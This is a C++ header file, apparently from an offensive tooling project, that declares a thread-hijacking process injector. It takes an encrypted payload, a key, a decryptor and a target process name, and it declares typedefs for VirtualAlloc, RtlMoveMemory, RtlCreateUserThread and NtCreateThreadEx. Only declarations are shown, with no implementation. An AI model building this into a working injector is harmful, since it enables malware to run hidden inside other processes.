#include "../Injector.h"
#ifndef UNTITLED_THREADHIJACKINGINJECTION_H
#define UNTITLED_THREADHIJACKINGINJECTION_H


class ThreadHijackingInjection: public Injector{
    char *procName_;
public:
    typedef LPVOID (WINAPI * VirtualAlloc_t)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect);
        
    typedef VOID (WINAPI * RtlMoveMemory_t)(
        VOID UNALIGNED *Destination, 
        const VOID UNALIGNED *Source, 
        SIZE_T Length);

    typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
        IN HANDLE ProcessHandle,
        IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
        IN BOOLEAN CreateSuspended,
        IN ULONG StackZeroBits,
        IN OUT PULONG StackReserved,
        IN OUT PULONG StackCommit,
        IN PVOID StartAddress,
        IN PVOID StartParameter OPTIONAL,
        OUT PHANDLE ThreadHandle,
        OUT PCLIENT_ID ClientId);

    typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
        OUT PHANDLE hThread,
        IN ACCESS_MASK DesiredAccess,
        IN PVOID ObjectAttributes,
        IN HANDLE ProcessHandle,
        IN PVOID lpStartAddress,
        IN PVOID lpParameter,
        IN ULONG Flags,
        IN SIZE_T StackZeroBits,
        IN SIZE_T SizeOfStackCommit,
        IN SIZE_T SizeOfStackReserve,
        OUT PVOID lpBytesBuffer);
    void Inject() override;
    ThreadHijackingInjection(unsigned char* key, unsigned char *payload, unsigned int payload_len, unsigned int key_len, Decryptor *dec, char *procName): Injector(key, payload, payload_len, key_len, dec), procName_(procName){}
};


#endif //UNTITLED_THREADHIJACKINGINJECTION_H
